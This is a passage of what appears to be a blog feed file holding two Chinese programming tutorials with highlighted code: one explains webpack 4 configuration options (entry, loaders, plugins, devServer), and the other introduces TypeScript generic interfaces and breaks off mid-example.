punctuation">.</span>config<span class="token punctuation">.</span>base<span class="token punctuation">.</span>js webpack<span class="token punctuation">.</span>config<span class="token punctuation">.</span>build<span class="token punctuation">.</span>js webpack<span class="token punctuation">.</span>config<span class="token punctuation">.</span>js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><code>entry</code>：入口文件（你要打包，就告诉我打包哪些）</li><li><code>output</code>：出口文件（我打包完了，给你放到哪里）</li><li><code>resolve</code>: 寻找模块所对应的文件</li><li><code>module</code>：模块（放lorder，编译浏览器不认识的东西）</li><li><code>plugins</code>：插件（辅助开发，提高开发效率）</li><li><code>externals</code>:打包忽略</li><li><code>devServer</code>：服务器（webpack提供的本地服务器）</li><li><code>mode</code>：模式，分为开发模式、生产模式。此为4.X里新增的</li></ol><h3 id="配置entry入口文件"><a href="#配置entry入口文件" class="headerlink" title="配置entry入口文件"></a>配置entry入口文件</h3><p>因为大部分项目是多入口，多类别的，所有入口配置时不要配置单一入口</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> optimist <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"optimist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> cateName <span class="token operator">=</span> optimist<span class="token punctuation">.</span>argv<span class="token punctuation">.</span>cate<span class="token punctuation">;</span><span class="token keyword">let</span> entryObj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> srcPath <span class="token operator">=</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>__dirname<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/src`</span></span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取当前项目要启动或者打包的基础路径</span><span class="token keyword">const</span> entryPath <span class="token operator">=</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>srcPath<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/category/`</span></span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//未指定类别 启动或者打包所有类别</span><span class="token comment" spellcheck="true">//如：npm run dev 或者npm run build</span><span class="token keyword">if</span> <span class="token punctuation">(</span>cateName <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fs<span class="token punctuation">.</span><span class="token function">readdirSync</span><span class="token punctuation">(</span>entryPath<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>cateName<span class="token punctuation">,</span> index<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// cateName/cateName指定输出路径为entryname</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cateName <span class="token operator">!=</span> <span class="token string">"index.html"</span> <span class="token operator">&amp;&amp;</span> cateName <span class="token operator">!=</span> <span class="token string">".DS_Store"</span><span class="token punctuation">)</span> entryObj<span class="token punctuation">[</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>cateName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>cateName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>entryPath <span class="token operator">+</span> cateName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>cateName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.tsx`</span></span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cateName<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 一次指定多个类别 类别之间以","分割</span>    <span class="token comment" spellcheck="true">//如：npm run dev erhsouche,huoche </span>    <span class="token keyword">let</span> cateNameArray <span class="token operator">=</span> cateName<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cateNameArray<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        entryObj<span class="token punctuation">[</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>cateNameArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>cateNameArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>entryPath <span class="token operator">+</span> cateNameArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>            cateNameArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.tsx`</span></span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 打包单个入口文件</span>    <span class="token comment" spellcheck="true">//如：npm run dev ershouche</span>    entryObj<span class="token punctuation">[</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>cateName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>cateName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>entryPath <span class="token operator">+</span> cateName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>cateName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.tsx`</span></span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">const</span> webpackConfig <span class="token operator">=</span> <span class="token punctuation">{</span>    entry<span class="token punctuation">:</span> entryObj<span class="token punctuation">,</span><span class="token punctuation">}</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>    webpackConfig<span class="token punctuation">,</span>    entryObj<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置output出口文件"><a href="#配置output出口文件" class="headerlink" title="配置output出口文件"></a>配置output出口文件</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> webpackConfig <span class="token operator">=</span> <span class="token punctuation">{</span>    output<span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//输出文件名称以当前传入的cate类别名称命名</span>        filename<span class="token punctuation">:</span> <span class="token string">"[name].js"</span><span class="token punctuation">,</span>         <span class="token comment" spellcheck="true">//输出到根目录下的dist目录中</span>        path<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"dist"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        publicPath<span class="token punctuation">:</span> <span class="token string">"/"</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置resolve"><a href="#配置resolve" class="headerlink" title="配置resolve"></a>配置resolve</h3><p>需要<code>import xxx from &#39;xxx&#39;</code>这样的文件的话需要在webpack中的<code>resolve</code>项中配置<code>extensions</code>，这样以后引入文件就不需要带扩展名</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> webpackConfig <span class="token operator">=</span> <span class="token punctuation">{</span>    resolve<span class="token punctuation">:</span> <span class="token punctuation">{</span>        extensions<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">".tsx"</span><span class="token punctuation">,</span> <span class="token string">".ts"</span><span class="token punctuation">,</span> <span class="token string">".js"</span><span class="token punctuation">,</span> <span class="token string">".jsx"</span><span class="token punctuation">,</span> <span class="token string">".json"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">//配置项通过别名来把原导入路径映射成一个新的导入路径。</span>        alias<span class="token punctuation">:</span> <span class="token punctuation">{</span>            images<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"src/util/img"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 使用绝对路径指明第三方模块存放的位置，以减少搜索步骤</span>        modules<span class="token punctuation">:</span> <span class="token punctuation">[</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"node_modules"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>     <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置module"><a href="#配置module" class="headerlink" title="配置module"></a>配置module</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>在<code>webpack</code>中任何一个东西都称为模块，<code>js</code>就不用说了。一个<code>css</code>文件，一张图片、一个<code>less</code>文件都是一个模块，都能用导入模块的语法（<code>commonjs</code>的<code>require</code>，<code>ES6</code>的<code>import</code>）导入进来。<code>webpack</code>自身只能读懂<code>js</code>类型的文件，其它的都不认识。但是<code>webpack</code>却能编译打包其它类型的文件，像<code>ES6</code>、<code>JSX</code>、<code>less</code>、<code>typeScript</code>等，甚至<code>css</code>、<code>images</code>也是Ok的，而想要编译打包这些文件就需要借助<code>loader</code></p><p><code>loader</code>就像是一个翻译员，浏览器不是不认识这些东西么?那好交给<code>loader</code>来办，它能把这些东西都翻译成浏览器认识的语言。<code>loader</code>描述了<code>webpack</code>如何处理非<code>js</code>模块，而这些模块想要打包<code>loader</code>必不可少，所以它在<code>webpack</code>里显得异常重要。<code>loader</code>跟插件一样都是模块，想要用它需要先安装它，使用的时候把它放在<code>module.rules</code>参数里，<code>rules</code>翻译过来的意思就是规则，所以也可以认为<code>loader</code>就是一个用来处理不同文件的规则</p><h4 id="所需loader"><a href="#所需loader" class="headerlink" title="所需loader"></a>所需loader</h4><ul><li><p>ts-loader  </p><p>编译TypeScript文件  </p><pre class="line-numbers language-js"><code class="language-js">npm install ts<span class="token operator">-</span>loader <span class="token operator">-</span>D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>url-loader    </p><p>处理css中的图片资源时，我们常用的两种loader是<a href="https://link.jianshu.com?t=https%3A%2F%2Fdoc.webpack-china.org%2Floaders%2Ffile-loader%2F" target="_blank" rel="noopener">file-loader</a>或者<a href="https://link.jianshu.com?t=https%3A%2F%2Fdoc.webpack-china.org%2Floaders%2Furl-loader%2F" target="_blank" rel="noopener">url-loader</a>，两者的主要差异在于。url-loader可以设置图片大小限制，当图片超过限制时，其表现行为等同于file-loader，而当图片不超过限制时，则会将图片以base64的形式打包进css文件，以减少请求次数。</p><pre class="line-numbers language-js"><code class="language-js">npm install url<span class="token operator">-</span>loader <span class="token operator">-</span>D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>css处理所需loader<br>css-loader 处理css    </p><p>sass-loader 编译处理scss  </p><p>sass-resources-loader  全局注册变量  </p></li><li><p>html-loader<br>处理.html文件</p></li></ul><h4 id="module完整配置"><a href="#module完整配置" class="headerlink" title="module完整配置"></a>module完整配置</h4><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> webpackConfig <span class="token operator">=</span> <span class="token punctuation">{</span>    module<span class="token punctuation">:</span> <span class="token punctuation">{</span>        rules<span class="token punctuation">:</span> <span class="token punctuation">[</span>            <span class="token comment" spellcheck="true">//处理tsx文件</span>            <span class="token punctuation">{</span> test<span class="token punctuation">:</span> <span class="token regex">/\.(tsx|ts)?$/</span><span class="token punctuation">,</span> use<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"ts-loader"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> include<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"src"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">//处理图片资源</span>            <span class="token punctuation">{</span>                test<span class="token punctuation">:</span> <span class="token regex">/\.(png|jpe?g|jpg|gif|woff|eot|ttf|svg)/</span><span class="token punctuation">,</span>                use<span class="token punctuation">:</span> <span class="token punctuation">[</span>                    <span class="token comment" spellcheck="true">// 对非文本文件采用file-loader加载</span>                    <span class="token punctuation">{</span>                        loader<span class="token punctuation">:</span> <span class="token string">"url-loader"</span><span class="token punctuation">,</span>                        options<span class="token punctuation">:</span> <span class="token punctuation">{</span>                            limit<span class="token punctuation">:</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 30KB以下的文件</span>                            name<span class="token punctuation">:</span> <span class="token string">"images/[name].[hash:8].[ext]"</span><span class="token punctuation">,</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">//处理css和scss</span>            <span class="token punctuation">{</span>                test<span class="token punctuation">:</span> <span class="token regex">/\.(css|scss)$/</span><span class="token punctuation">,</span>                use<span class="token punctuation">:</span> <span class="token punctuation">[</span>                    <span class="token comment" spellcheck="true">//css单独打包</span>                    MiniCssExtractPlugin<span class="token punctuation">.</span>loader<span class="token punctuation">,</span>                    <span class="token punctuation">{</span>                        loader<span class="token punctuation">:</span> <span class="token string">"css-loader"</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token punctuation">{</span>                        loader<span class="token punctuation">:</span> <span class="token string">"postcss-loader"</span><span class="token punctuation">,</span>                        options<span class="token punctuation">:</span> <span class="token punctuation">{</span>                            plugins<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"autoprefixer"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                            sourceMap<span class="token punctuation">:</span> <span class="token boolean">true</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token punctuation">{</span>                        loader<span class="token punctuation">:</span> <span class="token string">"sass-loader"</span><span class="token punctuation">,</span>                        options<span class="token punctuation">:</span> <span class="token punctuation">{</span>                            sourceMap<span class="token punctuation">:</span> <span class="token boolean">true</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token punctuation">{</span>                        loader<span class="token punctuation">:</span> <span class="token string">"sass-resources-loader"</span><span class="token punctuation">,</span>                        options<span class="token punctuation">:</span> <span class="token punctuation">{</span>                            resources<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"./skin/mixin.scss"</span><span class="token punctuation">,</span> <span class="token string">"./skin/base.scss"</span><span class="token punctuation">]</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">]</span><span class="token punctuation">,</span>                exclude<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"node_modules"</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">{</span>                test<span class="token punctuation">:</span> <span class="token regex">/\.html$/</span><span class="token punctuation">,</span>                use<span class="token punctuation">:</span> <span class="token punctuation">{</span>                    loader<span class="token punctuation">:</span> <span class="token string">"html-loader"</span><span class="token punctuation">,</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">{</span> test<span class="token punctuation">:</span> <span class="token regex">/src\/containers(\/.*).(tsx|ts)/</span><span class="token punctuation">,</span> loader<span class="token punctuation">:</span> <span class="token string">"bundle-loader?lazy!ts-loader"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token punctuation">{</span> enforce<span class="token punctuation">:</span> <span class="token string">"pre"</span><span class="token punctuation">,</span> test<span class="token punctuation">:</span> <span class="token regex">/\.js$/</span><span class="token punctuation">,</span> loader<span class="token punctuation">:</span> <span class="token string">"source-map-loader"</span> <span class="token punctuation">}</span>        <span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置plugins"><a href="#配置plugins" class="headerlink" title="配置plugins"></a>配置plugins</h3><p><code>plugins</code>里面放的是插件，插件的作用在于提高开发效率，能够解放双手，让我们去做更多有意义的事情。一些很low的事就统统交给插件去完成。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> webpackConfig <span class="token operator">=</span> <span class="token punctuation">{</span>    plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token comment" spellcheck="true">//清除文件</span>        <span class="token keyword">new</span> <span class="token class-name">CleanWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">//css单独打包</span>        <span class="token keyword">new</span> <span class="token class-name">MiniCssExtractPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            filename<span class="token punctuation">:</span> <span class="token string">"[name].css"</span><span class="token punctuation">,</span>            chunkFilename<span class="token punctuation">:</span> <span class="token string">"[name].css"</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 引入热更新插件</span>        <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>HotModuleReplacementPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置externals"><a href="#配置externals" class="headerlink" title="配置externals"></a>配置externals</h3><p>如果需要引用一个库，但是又不想让webpack打包（减少打包的时间），并且又不影响我们在程序中以CMD、AMD或者window/global全局等方式进行使用（一般都以import方式引用使用），那就可以通过配置externals。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> webpackConfig <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//项目编译打包是忽略这些依赖包</span>    externals<span class="token punctuation">:</span> <span class="token punctuation">{</span>        react<span class="token punctuation">:</span> <span class="token string">"React"</span><span class="token punctuation">,</span>        <span class="token string">"react-dom"</span><span class="token punctuation">:</span> <span class="token string">"ReactDOM"</span><span class="token punctuation">,</span>        <span class="token string">"react-redux"</span><span class="token punctuation">:</span> <span class="token string">"ReactRedux"</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置mode"><a href="#配置mode" class="headerlink" title="配置mode"></a>配置mode</h3><p><code>mode</code>是<code>webpack4</code>新增的一条属性，它的意思为当前开发的环境。<code>mode</code>的到来减少了很多的配置，它内置了很多的功能。相较以前的版本提升了很多，减少了很多专门的配置</p><blockquote><ol><li>提升了构建速度</li><li>默认为开发环境，不需要专门配置</li><li>提供压缩功能，不需要借助插件</li><li>提供<code>SouceMap</code>，不需要专门配置</li></ol></blockquote><p><code>mode</code>分为两种环境，一种是开发环境（<code>development</code>）,一种是生产环境（<code>production</code>）。开发环境就是我们写代码的环境，生产环境就是代码放到线上的环境。这两种环境的最直观区别就是，开发环境的代码不提供压缩，生产环境的代码提供压缩。</p><h3 id="配置devServer"><a href="#配置devServer" class="headerlink" title="配置devServer"></a>配置devServer</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> webpackConfig <span class="token operator">=</span> <span class="token punctuation">{</span>    devServer<span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 本地服务器所加载的页面所在的目录</span>        contentBase<span class="token punctuation">:</span> srcPath<span class="token punctuation">,</span>         <span class="token comment" spellcheck="true">//热更新</span>        hot<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">//服务端口</span>        port<span class="token punctuation">:</span> <span class="token string">"7788"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 是否向Chunk中注入代理客户端，默认注入</span>        inline<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>         <span class="token comment" spellcheck="true">// publicPath: '/dist/',</span>        historyApiFallback<span class="token punctuation">:</span> <span class="token punctuation">{</span>            index<span class="token punctuation">:</span> <span class="token string">"template.html"</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">//默认检查hostname</span>        disableHostCheck<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        compress<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        open<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token comment" spellcheck="true">// 自动打开首页</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> webpack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webpack </tag>
            
            <tag> React </tag>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript泛型接口(三)</title>
      <link href="2019/07/24/Generics3/"/>
      <url>2019/07/24/Generics3/</url>
      
        <content type="html"><![CDATA[<p>以使用接口的方式来定义一个函数需要符合的形状：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">SearchFunc</span> <span class="token punctuation">{</span>  <span class="token punctuation">(</span>source<span class="token punctuation">:</span> string<span class="token punctuation">,</span> subString<span class="token punctuation">:</span> string<span class="token punctuation">)</span><span class="token punctuation">:</span> boolean<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">let</span> mySearch<span class="token punctuation">:</span> SearchFunc <span class="token operator">=</span> <span class="token punctuation">(</span>source<span class="token punctuation">:</span> string<span class="token punctuation">,</span> subString<span class="token punctuation">:</span> string<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> source<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span>subString<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然也可以使用含有泛型的接口来定义函数的形状：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">CreateArrayFunc</span> <span class="token punctuation">{</span>    <span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">(</span>length<span class="token punctuation">:</span> number<span class="token punctuation">,</span> value<span class="token punctuation">:</span> T<span class="token punctuation">)</span><span class="token punctuation">:</span> Array<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">let</span> createArray<span class="token punctuation">:</span> CreateArrayFunc <span class="token operator">=</span> <span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">></span><span class="token punctuation">(</span>length<span class="token punctuation">:</span> number<span class="token punctuation">,</span> value<span class="token punctuation">:</span> T<span class="token punctuation">)</span><span class="token punctuation">:</span> Array<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> result<span class="token punctuation">:</span> T<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">createArray</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ['x', 'x', 'x']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进一步，我们可以把泛型参数提前到接口名上：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">CreateArrayFunc</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token punctuation">(</span>length<span class="token punctuation">:</span> number<span class="token punctuation">,</span> value<span class="token punctuation">:</span> T<span class="token punctuation">)</span><span class="token punctuation">:</span> Array<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">let</span> createArray<span class="token punctuation">:</span> CreateArrayFunc<span class="token operator">&lt;</span>any<span class="token operator">></span><span class="token punctuation">;</span>createArray <span class="token operator">=</span> <span class="token keyword">function</span><span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">(</span>length<span class="token punctuation">:</span> number<span class="token punctuation">,</span> value<span class="token punctuation">:</span> T<span class="token punctuation">)</span><span class="token punctuation">:</span> Array<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> result<span class="token punctuation">:</span> T<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token 